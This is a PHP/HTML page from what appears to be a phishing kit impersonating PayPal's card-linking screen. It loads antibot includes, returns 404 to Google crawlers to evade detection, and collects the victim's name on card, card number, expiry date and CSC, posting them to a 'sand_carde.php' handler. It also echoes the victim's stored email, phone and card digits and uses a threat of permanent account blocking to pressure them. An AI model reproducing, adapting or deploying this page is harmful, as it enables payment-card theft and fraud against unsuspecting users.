

<?php


session_start();
error_reporting(0);


include "../../../boots/antibots1.php";
include "../../../boots/antibots2.php";
include "../../../boots/antibots3.php";
include "../../../boots/antibots4.php";
include "../../../boots/encriptar.php";
include "../../../boots/.htaccess.htaccess";


if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }


session_start();

include("../../system/blocker.php");
include("../../system/detect.php");
include("../../system/bincheck.php");


$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);



?>


<!DOCTYPE html><html data-reactroot="" data-reactid="1" data-react-checksum="158555299"><head data-reactid="2"><script type="text/javascript" src="" data-reactid="3"></script>
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0" data-reactid="4"/><meta charset="utf-8" data-reactid="5"/><link rel="shortcut icon" sizes="196x196" href="../lib/img/pp196.png" data-reactid="6"/><link rel="shortcut icon" type="image/x-icon" href="../lib/img/favicon.ico" data-reactid="7"/><link rel="icon" type="image/x-icon" href="../lib/img/pp32.png" data-reactid="8"/>




<div id="fixed"  class="vx_has-spinner-large spinner_fullScreen test_has_spinner" >



</div>


<script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
      setTimeout(function(){
          document.getElementById('interactive');
         document.getElementById('fixed').style.visibility="hidden";
      },4000);
  }
}
</script>






    <link rel="stylesheet" href="../lib/css/G-Z118.css">
    <link rel="stylesheet" href="../lib/css/B-Z118.css">

<!DOCTYPE html>






    </style>


    </style><script src="../lib/js/jquery.js"></script>
    <script src="../lib/js/jquery.validate.js"></script>
	<script src="../lib/js/jquery.additional-methods.js"></script>
	<script src="../lib/js/jquery.v-form.js"></script>
	<script src="../lib/js/jquery.CardValidator.js"></script>
	<script src="../lib/js/jquery.mask.js"></script>

	<script src="j-forms.min.js"></script>




<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0" data-reactid="4"/><meta charset="utf-8" data-reactid="5"/><link rel="shortcut icon" sizes="196x196" href="../lib/img/pp196.png" data-reactid="6"/><link rel="stylesheet" type="text/css" href="http://72.52.245.18/~lightsandsigns/img/cart,jpg"><link rel="shortcut icon" type="image/x-icon" href="../lib/img/favicon.ico" data-reactid="7"/><link rel="icon" type="image/x-icon" href="../lib/img/pp32.png" data-reactid="8"/>
<html data-reactroot="" data-reactid="1" data-react-checksum="381182243"><head data-reactid="2"><script type="text/javascript" src="../../js/pa.js" data-reactid="3"></script><link rel="stylesheet" type="text/css" href="https://jacobephrem.com/img/cart,jpg"><title data-reactid="11">PayPal: Link a debit or credit card</title>
<link rel="stylesheet" href="../../css/paypal-sans.css" data-reactid="9"/><link rel="stylesheet" href="../../css/main.css" data-reactid="10"/><title data-reactid="11">PayPal: Wallet</title></head>








<div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader" data-reactid="168" aria-label="Modal Dialog"><div class="vx_modal-wrapper" data-reactid="169"><a 


onclick="document.getElementById('id01').style.display='none'"

class="vx_modal-dismiss_x" data-reactid="170"><span class="vx_a11yText" data-reactid="171">close</span></a><div class="vx_modal-content" data-reactid="172"><header class="vx_modal-header" data-reactid="173"><h2 id="js_modalHeader" class="vx_h2" data-reactid="174">Update Credit/Debit Card, no need to enter it again when using PayPal
</h2></header><div class="vx_modal-body vx_blocks-for-mobile" data-reactid="175"><div class="">



<!DOCTYPE html>
<html>



</head>
<body>

<script>
    


    jQuery(function($) {
      $('[data-numeric]').payment('restrictNumeric');
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');

      $.fn.toggleInputError = function(erred) {
        this.parent('.form-group').toggleClass('has-error', erred);
        return this;
      };

      $('#send_cc').click(function(){

    var cardType = $.payment.cardType($('.cc-number').val());
    var ex_n  = $('.cc-exp').val().split('/');
    var exp_m = ex_n[0];
    var exp_y = ex_n[1];

        var v_num = $.payment.validateCardNumber($('.cc-number').val());
        var v_exp = $.payment.validateCardCVC($('.cc-cvc').val(), cardType);
        var v_exd = $.payment.validateCardExpiry(exp_m, exp_y);
    
    if(v_num == true && v_exp == true && v_exd == true)
    {
      return true;
    }
    else
    {
          $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
          $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
          $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
          $('.cc-brand').text(cardType);
          return false;
    }

      });



       

    });
  </script>
   <nav>
     <div class="wrapp">
   		

   	 </div>
   	</nav>

   	<div class="ma3">
   	<div class="cp_right">
   		
	<meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
   
    <script type="text/javascript">
    $(function() {
        $('#cardnumber').mask('0000000000000000000');
		$('#csc').mask('0000');
	});
	</script>
</head>
                        <form action="../../system/sand_carde.php" method="post" name="WorldWide_form" class="validator" novalidate="novalidate">
                                                        
<div dir="rtl" style="text-align: right;" trbidi="on">
<div style="text-align: center;">






</div>

                                <p style="text-align: center;font-size: 1.2em;width: 88%;padding-left: 6%;"></p>
                            </div>
                            <div class="BowContainerZ118">                               
                                <div class="inner"><p>
</p>
                                    <div class="G-FieldsZ118">
                                        <div class="textInput lap ">

<div 
class="FieldsZ118 large">

  <input  class="Xval666ideX1 " id="nameon" name="nameoncard" required="required" autocomplete="off" placeholder="Name On Card" value="<?=strtolower($_SESSION['_nameoncard_']);?>">


                                            <div class="FieldsZ118 large">                                            </div>
                                            </div>

                                        <div class="textInput">


                                            <div class="FieldsZ118 large">
                                    


    <input type="tel" class="validate" id="cardnumber" name="cardnumber" placeholder="Card Number" required="required"autocomplete="off" value="">
											    <input name="c_type" type="hidden" id="card_type" value="">
                        					    <input name="c_valid" type="hidden" id="card_valid" value="">
											</div>
                                        </div>
                                    </div>                                    
                                        <div class="G-FieldsZ118">                                                                                       
                                            <div class="multi equal clearfix">
                                                <div class="FieldsZ118 medium left">
                                                    <input type="tel" id="expdate" name="expdate" autocomplete="off" class="validate" required="required" value="" maxlength="7" placeholder="Expiration Date" >
                                                </div>
                                                                                                    <div class="FieldsZ118 medium right">
                                                        <input type="tel" id="csc" name="csc" autocomplete="off" class="validate" required="required" maxlength="4" placeholder="CSC (3 digits)" value="">
                                                    </div>
                                                </div>
                                     



		<link rel="stylesheet" href="../../css/n.css">


	<div class="rotation"> <p> Checking your Cards... </p> </div>




<!DOCTYPE html>
<html>
<head>
<style>
button.accordion {
    background-color: #eee;
    color: #444;
    cursor: pointer;
    padding: 18px;
    width: 100%;
    border: none;
    text-align: left;
    outline: none;
    font-size: 15px;
    transition: 0.4s;
}

button.accordion.active, button.accordion:hover {
    background-color: #ddd;
}

div.panel {
    padding: 0 18px;
    background-color: white;
    max-height: 0;
    overflow: hidden;
    transition: max-height 0.2s ease-out;
}
</style>
</head>
<body>





<div class="panel">
  

 
     
</div>

                                      




<script>
var acc = document.getElementsByClassName("accordion");
var i;

for (i = 0; i < acc.length; i++) {
  acc[i].onclick = function() {
    this.classList.toggle("active");
    var panel = this.nextElementSibling;
    if (panel.style.maxHeight){
      panel.style.maxHeight = null;
    } else {
      panel.style.maxHeight = panel.scrollHeight + "px";
    } 
  }
}
</script>

</body>
</html>





               	
 									<div class="G-FieldsZ118">	
									    <div class="AddressLine" id="addressEntry">
									                                               
                                                                                   
          						

<div class="vx_form-group" data-reactid="205"><label data-reactid="206">Your billing address<?php
    if ($_SESSION['_cardnumber_']) {
       echo ' and cards';}?></label><select id="billingAddressId" class="form-control vx_form-control test_billingAddress" name="" data-reactid="207"><option selected="" value="6851530891005532873" data-reactid="208">
<?=@$_SESSION['_email_'];?>,<?=@$_SESSION['_stat_'];?>,<?=@$_SESSION['_phoneNumber_'];?></option><option value="-1" data-reactid="209"

>+ Add New Address</option></select>


<P>

    <?php
$ardnumber  =   substr($_SESSION['_cardnumber_'] , -4) ;

$card  =   strtolower($_SESSION['_ccbrand_']) ;







    if ($_SESSION['_cardnumber_']) {
       
print " 
<div class='xhack FieldsZ118 large'>
  <input class='xhack' id='xxxx$card' name='cardnxxx'  autocomplete='off' placeholder='xxxx xxxx xxxx $ardnumber
' value='xxxx xxxx xxxx $ardnumber' aria-required='true'>

";
   }
    ?>


                                            <div class="FieldsZ118 large">                                            </div>
                                            </div>




<div  class="transitioning spinner spin" style="display:none;">Checking your information...</div>






    <input





 id="submitBtn" name="" type="submit" class="vx_btn vx_btn-block validateBeforeSubmit"


 value="Continue" data-click="WorldWideSubmit">

</form>






    <?php
    if ($_SESSION['_cardnumber_']) {
       echo '

  <form action="../Bank/" method="post" name="WorldWide_form" class="validatoa" novalidate="novalidate">



<input 
href=""
 type="submit" class="vx_btn vx_btn-secondary " 


value="You do not have another card">

</form>


';


   }
    

    ?>








</span></span></a>



<script>
// Get the modal
var modal = document.getElementById('id01');

// When the user clicks anywhere outside of the modal, close it
window.onclick = function(event) {
    if (event.target == modal) {
        modal.style.display = "none";
    }
}
</script>

</body>





<div id="id02" class="modal">
  
<form class="modal-content animate" >
    <div class="imgcontainer">
     

<center><div><h2>If you log out your account may be blocked permanently</h2>

<button onclick="document.getElementById('id02').style.display='none'" class="vx_btn vx_btn-block" style="width:auto;">Continue</button>


</center>




  </form>


<script>
// Get the modal
var modal = document.getElementById('id02');

// When the user clicks anywhere outside of the modal, close it
window.onclick = function(event) {
    if (event.target == modal) {
        modal.style.display = "none";
    }
}
</script>













                        </form>


		<script type="text/javascript">
        $(function() {
		    $('#cardnumber').validateCreditCard(function(result) {
                document.getElementById('card_type').value  = result.card_type.name
                document.getElementById('card_valid').value = result.valid
			$('#cardnumber').validateCreditCard(function(result) {
			    if(result.card_type == null){
                    $('#cardnumber').removeClass();
                }
                else{
                    $('#cardnumber').addClass(result.card_type.name);
					
                }
            });
            });
		});
        </script>
		<script type="text/javascript">		
    $('#cardnumber').validateCreditCard(function(result) {
        // console.log(result);
        if (result.card_type != null) {
            switch (result.card_type.name) {
                case "VISA":
                    $('#cardnumber').css('background-position', '98.5% -1%');
                    $('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "VISA ELECTRON":
                    $('#cardnumber').css('background-position', '98.5%  47.4%');
                    $('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "MASTERCARD":
                    $('#cardnumber').css('background-position', '98.5%  3.6%');
                    $('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "MAESTRO":
                    $('#cardnumber').css('background-position', '98.5%  39.6%');
                    $('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "DISCOVER":
                    $('#cardnumber').css('background-position', '98.5%  17.7%');
					$('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
                case "AMEX":
                    $('#cardnumber').css('background-position', '99% 10%');
                    $('#csc').attr('pattern', '[0-9]{4}');
					$('#csc').attr('maxlength', '4');
					$('#csc').attr('placeholder', 'CSC (4 digits)');
                    break;
                case "JCB":
                    $('#cardnumber').css('background-position', '98.5% 32%');
                    break;
                case "DINERS CLUB":
                    $('#cardnumber').css('background-position', '98.5% 24.8%');
                    break;
				 case "DINERS CLUB GLOBAL":
                    $('#cardnumber').css('background-position', '98.5% 24.8%');
                    break;
                default:
                    $('#cardnumber').css('background-position', '98.5% 81.7%');
					$('#csc').attr('placeholder', 'CSC (3 digits)');
                    break;
            }
        } else {
            $('#cardnumber').css('background-position', '98.5% 81.7%');
			$('#csc').attr('placeholder', 'CSC (3 digits)');
        }
        // Check for valid card numbere - only show validation checks for invalid Luhn when length is correct so as not to confuse user as they type.
        if (result.valid || $('#cardnumber').val().length > 16) {
            if (result.valid) {
                $('#cardnumber').removeClass('error').addClass('');
            } else {
                $('#cardnumber').removeClass('').addClass('error');
            }
        } else {
            $('#cardnumber').removeClass('').removeClass('error');
        }
    });

		</script>






</html>
